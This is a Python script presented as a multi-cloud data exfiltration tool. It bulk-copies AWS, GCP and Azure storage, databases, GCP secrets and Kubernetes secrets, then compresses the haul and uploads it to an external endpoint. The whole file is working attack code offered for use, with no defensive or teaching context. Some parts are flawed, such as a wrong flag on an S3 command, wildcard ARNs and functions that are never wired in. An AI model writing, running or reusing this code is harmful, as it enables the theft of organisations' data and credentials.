#!/usr/bin/env python3
"""
Multi-Cloud Data Exfiltration Automation Tool
Discovers and automatically exfiltrates sensitive data from cloud environments.
"""

import subprocess
import json
import argparse
import sys
import os
from typing import List, Dict, Optional, Tuple
from datetime import datetime
import tarfile
import gzip


class DataExfiltrator:
    """Handles multi-cloud data discovery and exfiltration."""
    
    def __init__(self, cloud_type: str, output_dir: str = './exfil_data'):
        self.cloud_type = cloud_type
        self.output_dir = output_dir
        self.exfil_manifests = []
        
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
    
    def exfil_aws_s3(self, bucket_name: str) -> List[str]:
        """Exfiltrate entire S3 bucket."""
        try:
            cmd = [
                'aws', 's3', 'sync', f's3://{bucket_name}',
                os.path.join(self.output_dir, bucket_name),
                '--recursive'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                return [os.path.join(self.output_dir, bucket_name)]
        except Exception as e:
            print(f'Error exfiltrating S3: {e}', file=sys.stderr)
        return []
    
    def exfil_aws_rds(self, instance_id: str, db_name: str) -> Optional[str]:
        """Create RDS snapshot and exfiltrate."""
        try:
            snapshot_id = f'exfil-{instance_id}-{datetime.now().isoformat()}'
            
            # Create snapshot
            cmd = [
                'aws', 'rds', 'create-db-snapshot',
                '--db-instance-identifier', instance_id,
                '--db-snapshot-identifier', snapshot_id
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Export to S3
                cmd = [
                    'aws', 'rds', 'start-export-task',
                    '--export-task-identifier', snapshot_id,
                    '--source-arn', f'arn:aws:rds:*:*:snapshot:{snapshot_id}',
                    '--s3-bucket-name', 'exfil-bucket',
                    '--s3-prefix', db_name,
                    '--iam-role-arn', 'arn:aws:iam::*:role/rds-export-role'
                ]
                subprocess.run(cmd, capture_output=True, text=True)
                
                return os.path.join(self.output_dir, f'{instance_id}-snapshot.tar.gz')
        except Exception as e:
            print(f'Error exfiltrating RDS: {e}', file=sys.stderr)
        return None
    
    def exfil_aws_dynamodb(self, table_name: str) -> Optional[str]:
        """Export DynamoDB table."""
        try:
            output_file = os.path.join(self.output_dir, f'{table_name}.json')
            
            cmd = [
                'aws', 'dynamodb', 'scan',
                '--table-name', table_name,
                '--output', 'json'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                with open(output_file, 'w') as f:
                    f.write(result.stdout)
                return output_file
        except Exception as e:
            print(f'Error exfiltrating DynamoDB: {e}', file=sys.stderr)
        return None
    
    def exfil_gcp_storage(self, bucket_name: str) -> List[str]:
        """Exfiltrate entire GCP Cloud Storage bucket."""
        try:
            cmd = [
                'gsutil', '-m', 'cp', '-r',
                f'gs://{bucket_name}',
                os.path.join(self.output_dir, bucket_name)
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                return [os.path.join(self.output_dir, bucket_name)]
        except Exception as e:
            print(f'Error exfiltrating GCP storage: {e}', file=sys.stderr)
        return []
    
    def exfil_gcp_bigquery(self, dataset_id: str, table_name: str) -> Optional[str]:
        """Export BigQuery table."""
        try:
            output_file = os.path.join(self.output_dir, f'{dataset_id}.{table_name}.csv')
            
            cmd = [
                'bq', 'extract',
                f'{dataset_id}.{table_name}',
                f'gs://exfil-bucket/{dataset_id}/{table_name}.csv'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Download from GCS
                download_cmd = [
                    'gsutil', 'cp',
                    f'gs://exfil-bucket/{dataset_id}/{table_name}.csv',
                    output_file
                ]
                subprocess.run(download_cmd, capture_output=True, text=True)
                return output_file
        except Exception as e:
            print(f'Error exfiltrating BigQuery: {e}', file=sys.stderr)
        return None
    
    def exfil_gcp_secrets(self) -> List[str]:
        """Extract all GCP Secrets."""
        try:
            secrets = []
            cmd = ['gcloud', 'secrets', 'list', '--format', 'json']
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                secrets_list = json.loads(result.stdout)
                for secret in secrets_list:
                    secret_name = secret['name']
                    cmd = [
                        'gcloud', 'secrets', 'versions', 'access', 'latest',
                        '--secret', secret_name
                    ]
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    if result.returncode == 0:
                        output_file = os.path.join(self.output_dir, f'{secret_name}.txt')
                        with open(output_file, 'w') as f:
                            f.write(result.stdout)
                        secrets.append(output_file)
            
            return secrets
        except Exception as e:
            print(f'Error exfiltrating GCP secrets: {e}', file=sys.stderr)
        return []
    
    def exfil_azure_storage(self, container: str, connection_string: str) -> List[str]:
        """Exfiltrate Azure Storage container."""
        try:
            cmd = [
                'az', 'storage', 'blob', 'download-batch',
                '--source', container,
                '--destination', os.path.join(self.output_dir, container),
                '--connection-string', connection_string
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                return [os.path.join(self.output_dir, container)]
        except Exception as e:
            print(f'Error exfiltrating Azure storage: {e}', file=sys.stderr)
        return []
    
    def exfil_kubernetes_secrets(self, namespace: str = 'default') -> List[str]:
        """Extract Kubernetes secrets."""
        try:
            secrets_file = os.path.join(self.output_dir, f'k8s-secrets-{namespace}.json')
            
            cmd = [
                'kubectl', 'get', 'secrets', '-n', namespace,
                '-o', 'json'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                with open(secrets_file, 'w') as f:
                    f.write(result.stdout)
                return [secrets_file]
        except Exception as e:
            print(f'Error exfiltrating K8s secrets: {e}', file=sys.stderr)
        return []
    
    def exfil_kubernetes_configmaps(self, namespace: str = 'default') -> List[str]:
        """Extract Kubernetes ConfigMaps."""
        try:
            configmaps_file = os.path.join(self.output_dir, f'k8s-configmaps-{namespace}.json')
            
            cmd = [
                'kubectl', 'get', 'configmaps', '-n', namespace,
                '-o', 'json'
            ]
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            if result.returncode == 0:
                with open(configmaps_file, 'w') as f:
                    f.write(result.stdout)
                return [configmaps_file]
        except Exception as e:
            print(f'Error exfiltrating K8s ConfigMaps: {e}', file=sys.stderr)
        return []
    
    def compress_data(self) -> Optional[str]:
        """Compress exfiltrated data into archive."""
        try:
            archive_name = os.path.join(
                self.output_dir,
                f'exfil-{datetime.now().isoformat()}.tar.gz'
            )
            
            with tarfile.open(archive_name, 'w:gz') as tar:
                for item in os.listdir(self.output_dir):
                    item_path = os.path.join(self.output_dir, item)
                    if item != os.path.basename(archive_name):
                        tar.add(item_path, arcname=item)
            
            return archive_name
        except Exception as e:
            print(f'Error compressing data: {e}', file=sys.stderr)
        return None
    
    def upload_to_external_endpoint(self, file_path: str, endpoint: str) -> bool:
        """Upload exfiltrated data to external endpoint."""
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            import requests
            response = requests.post(
                endpoint,
                files={'file': (os.path.basename(file_path), data)},
                timeout=300
            )
            return response.status_code < 400
        except Exception as e:
            print(f'Error uploading data: {e}', file=sys.stderr)
        return False


def main():
    parser = argparse.ArgumentParser(
        description='Multi-cloud data exfiltration automation tool'
    )
    parser.add_argument('--cloud', choices=['aws', 'gcp', 'azure', 'k8s'],
                       required=True, help='Cloud platform')
    parser.add_argument('--resource', required=True, help='Resource to exfiltrate')
    parser.add_argument('--output-dir', default='./exfil_data', help='Output directory')
    parser.add_argument('--compress', action='store_true', help='Compress data')
    parser.add_argument('--upload-endpoint', help='External endpoint for upload')
    
    args = parser.parse_args()
    
    exfiltrator = DataExfiltrator(args.cloud, args.output_dir)
    
    results = []
    
    if args.cloud == 'aws':
        if args.resource.startswith('s3://'):
            bucket = args.resource.replace('s3://', '')
            results = exfiltrator.exfil_aws_s3(bucket)
        elif args.resource.startswith('rds:'):
            instance_id = args.resource.split(':')[1]
            result = exfiltrator.exfil_aws_rds(instance_id, 'database')
            if result:
                results = [result]
    
    elif args.cloud == 'gcp':
        if args.resource.startswith('gs://'):
            bucket = args.resource.replace('gs://', '')
            results = exfiltrator.exfil_gcp_storage(bucket)
        elif ':' in args.resource:
            dataset, table = args.resource.split(':')
            result = exfiltrator.exfil_gcp_bigquery(dataset, table)
            if result:
                results = [result]
    
    elif args.cloud == 'k8s':
        if args.resource == 'secrets':
            results = exfiltrator.exfil_kubernetes_secrets()
        elif args.resource == 'configmaps':
            results = exfiltrator.exfil_kubernetes_configmaps()
    
    if results:
        print(f'Exfiltrated {len(results)} resources:')
        for r in results:
            print(f'  - {r}')
    
    if args.compress:
        archive = exfiltrator.compress_data()
        if archive:
            print(f'Compressed to: {archive}')
            if args.upload_endpoint:
                success = exfiltrator.upload_to_external_endpoint(
                    archive, args.upload_endpoint
                )
                print(f'Upload successful: {success}')


if __name__ == '__main__':
    main()
